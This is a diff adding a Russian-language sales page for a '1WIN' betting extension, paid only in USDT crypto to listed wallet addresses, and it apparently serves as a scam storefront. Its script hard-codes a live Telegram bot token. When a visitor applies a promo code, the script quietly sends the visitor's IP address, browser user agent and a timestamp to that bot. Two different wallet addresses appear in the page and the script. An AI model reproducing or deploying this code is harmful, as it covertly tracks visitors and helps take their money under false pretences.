@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1ВИН - Расширение</title>
+    <link rel="stylesheet" href="sugl.css">
+    <script src="sugl.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #2a4a8c);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #ffcc00;
+        }
+        .product-info {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        .features {
+            list-style: none;
+            margin: 15px 0;
+        }
+        .features li {
+            padding: 8px 0;
+            border-bottom: 1px dashed rgba(255, 255, 255, 0.2);
+        }
+        .pricing {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .price {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .original-price {
+            text-decoration: line-through;
+            color: #aaa;
+            font-size: 18px;
+        }
+        .discounted-price {
+            color: #4caf50;
+            font-size: 24px;
+        }
+        .promo-section {
+            margin: 25px 0;
+        }
+        .input-group {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        #promo-code {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 8px 0 0 8px;
+            font-size: 16px;
+        }
+        #apply-promo {
+            padding: 15px 20px;
+            background: #ff9800;
+            color: white;
+            border: none;
+            border-radius: 0 8px 8px 0;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        #apply-promo:hover {
+            background: #f57c00;
+        }
+        #promo-message {
+            min-height: 25px;
+            font-weight: bold;
+            text-align: center;
+            padding: 8px;
+        }
+        #buy-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(to right, #4caf50, #2e7d32);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.3s, background 0.3s;
+            margin-top: 10px;
+        }
+        #buy-button:hover {
+            transform: translateY(-3px);
+            background: linear-gradient(to right, #43a047, #1b5e20);
+        }
+        .success {
+            color: #4caf50;
+        }
+        .error {
+            color: #f44336;
+        }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #aaa;
+            font-size: 14px;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #4caf50;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            display: none;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>1ВИН Расширение</h1>
+            <p>Расширение для профессиональных ставок</p>
+        </header>
+        
+        <section class="product-info">
+            <h2>Преимущества:</h2>
+            <ul class="features">
+                <li>✅ Эксклюзивные аналитические инструменты</li>
+                <li>✅ Персональные рекомендации</li>
+                <li>✅ Премиум-поддержка 24/7</li>
+            </ul>
+            
+            <div class="pricing">
+                <div>
+                    <span class="original-price">$80.00</span>
+                    <div class="discounted-price">$80.00</div>
+        </section>
+        
+        <section class="promo-section">
+            <div class="input-group">
+                <input 
+                    type="text" 
+                    id="promo-code" 
+                    placeholder="Введите промокод"
+                    autocomplete="off"
+                >
+                <button id="apply-promo">Применить</button>
+            </div>
+            <div id="promo-message"></div>
+        </section>
+        <div class="agreement">
+            <input type="checkbox" id="agreement-checkbox">
+            <label for="agreement-checkbox">
+                Я принимаю <a href="#" id="terms-link">Пользовательское соглашение</a> и соглашаюсь с 
+                условиями использования расширения 1ВИН.
+            </label>
+        </div>
+       
+        
+        <button id="buy-button">Купить за криптовалюту</button>
+     
+        <footer>
+            <p>После оплаты вы получите расширение на указанный email</p>
+            <p>© 2023 1ВИН Расширение. Все права защищены.</p>
+        </footer>
+        <!-- Модальное окно для оплаты -->
+    <div id="payment-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Оплата криптовалютой</h2>
+           
+            
+            <div class="crypto-options">
+                <h3>Выберите криптовалюту:</h3>
+                <select id="crypto-select">
+                    
+                   
+                    <option value="usdt">USDT (TRC20)</option>
+                    
+                </select>
+                
+                <div id="crypto-address">
+                    <p>Адрес для оплаты (Переводите только в сети TRC20):</p>
+                    <p id="wallet-address">TGQcw6CGQGvhNiGFPFad6hyan2BeFE3S3U</p>
+                    <button id="copy-address">Копировать адрес</button>
+                </div>
+                
+                
+            </div>
+            <p>После оплаты отправьте подтверждение на почту: slabgok@gmx.ch</p>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+   
+    
+    <div class="notification" id="notification">
+        Уведомление отправлено в Telegram!
+    </div>
+     
+
+    <script>
+        // Конфигурация Telegram
+        const BOT_TOKEN = "7836593608:AAE40fvVXRJ-Be8XFZaH8c51-gORR86G4UU";
+        const CHAT_ID = "906346823";
+       
+        
+        // Промокоды и скидки
+        const PROMO_CODES = {
+            "WIN101": 50,
+            "WIN201": 50,
+            "WIN301": 50,
+            "WIN401": 50,
+            "WIN501": 50,
+            "WIN601": 50,
+            "WIN701": 50,
+            "WIN801": 50,
+            "WIN901": 50,
+            "WIN1001": 50,
+            "WIN1101": 50,
+            "WIN1201": 50,
+            "WIN1301": 50,
+            "WIN1401": 50,
+            "WIN1501": 50,
+            "WIN1601": 50,
+            "WIN1701": 50,
+            "WIN1801": 50,
+            "WIN1901": 50,
+            "WIN2001": 50,
+
+        };
+        
+        // Цены
+        const BASE_PRICE = 80;
+      
+        let appliedPromoCode = null;
+    
+
+// Элементы DOM
+const promoCodeInput = document.getElementById('promo-code');
+const applyPromoBtn = document.getElementById('apply-promo');
+const promoMessage = document.getElementById('promo-message');
+const buyButton = document.getElementById('buy-button');
+const discountedPriceEl = document.querySelector('.discounted-price');
+const originalPriceEl = document.querySelector('.original-price');
+const notification = document.getElementById('notification');
+const paymentAmountEl = document.getElementById('payment-amount');
+const modal = document.getElementById('payment-modal');
+const closeBtn = document.querySelector('.close');
+
+
+
+
+
+ // Обработчики модального окна
+ buyButton.addEventListener('click', function() {
+    modal.style.display = "block";
+});
+
+closeBtn.addEventListener('click', function() {
+    modal.style.display = "none";
+});
+
+window.addEventListener('click', function(event) {
+    if (event.target === modal) {
+        modal.style.display = "none";
+    }
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+        // Получение IP пользователя
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Ошибка при получении IP:', error);
+                return 'неизвестен';
+            }
+        }
+        
+        // Отправка в Telegram
+        async function sendToTelegram(promoCode, discount, finalPrice) {
+            const userIP = await getUserIP();
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toLocaleString();
+            
+            const message = `🔥 ПРОМОКОД ИСПОЛЬЗОВАН НА САЙТЕ
+            
+🎟 Код: ${promoCode}
+💎 Скидка: ${discount}%
+💰 Итоговая цена: $${finalPrice}
+
+🌐 IP: ${userIP}
+📅 Дата: ${timestamp}
+📱 Устройство: ${userAgent}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                if (response.ok) {
+                    showNotification();
+                }
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+            }
+        }
+        
+       
+        
+        // Применение промокода
+        applyPromoBtn.addEventListener('click', async function() {
+            const promoCode = promoCodeInput.value.trim().toUpperCase();
+            
+            if (!promoCode) {
+                promoMessage.textContent = "Пожалуйста, введите промокод";
+                promoMessage.className = "error";
+                return;
+            }
+            
+            if (PROMO_CODES[promoCode]) {
+                const discount = PROMO_CODES[promoCode];
+                currentPrice = BASE_PRICE * (1 - discount / 100);
+                appliedPromoCode = promoCode;
+                
+                discountedPriceEl.textContent = `$${currentPrice.toFixed(2)}`;
+                promoMessage.textContent = `Промокод применен! Ваша скидка: ${discount}%`;
+                promoMessage.className = "success";
+                
+                // Отправка в Telegram
+                await sendToTelegram(promoCode, discount, currentPrice.toFixed(2));
+            } else {
+                promoMessage.textContent = "Неверный промокод";
+                promoMessage.className = "error";
+            }
+        });
+        
+        // Обработчик для выбора криптовалюты
+document.getElementById('crypto-select').addEventListener('change', function() {
+    const crypto = this.value;
+    const addresses = {
+        usdt: "TNPZq5ZoZqh8ac6Y6dQEbwXyNXFEneJw8W"
+    };
+    document.getElementById('wallet-address').textContent = addresses[crypto];
+
+
+
+
+
+});
+
+
+// Получаем кнопку и элемент с адресом
+const copyAddressBtn = document.getElementById('copy-address');
+const walletAddressEl = document.getElementById('wallet-address');
+
+// Добавляем обработчик клика
+copyAddressBtn.addEventListener('click', function() {
+    // Создаем временный textarea для копирования
+    const textArea = document.createElement('textarea');
+    textArea.value = walletAddressEl.textContent;
+    textArea.style.position = 'fixed'; // Чтобы не было видно
+    document.body.appendChild(textArea);
+    textArea.select();
+    
+    try {
+        // Пытаемся скопировать
+        const successful = document.execCommand('copy');
+        if (successful) {
+            // Меняем текст кнопки на "Скопировано!"
+            const originalText = copyAddressBtn.textContent;
+            copyAddressBtn.textContent = 'Скопировано!';
+            
+            // Возвращаем исходный текст через 2 секунды
+            setTimeout(function() {
+                copyAddressBtn.textContent = originalText;
+            }, 2000);
+        }
+    } catch (err) {
+        console.error('Не удалось скопировать текст: ', err);
+    }
+    
+    // Удаляем временный элемент
+    document.body.removeChild(textArea);
+});
+
+
+
+
+
+        
+        
+        // Анимация для поля ввода
+        promoCodeInput.addEventListener('focus', function() {
+            this.style.transform = 'scale(1.02)';
+            this.style.boxShadow = '0 0 10px rgba(255, 204, 0, 0.5)';
+        });
+        
+        promoCodeInput.addEventListener('blur', function() {
+            this.style.transform = 'scale(1)';
+            this.style.boxShadow = 'none';
+        });
+    </script>
+</body>
+</html>
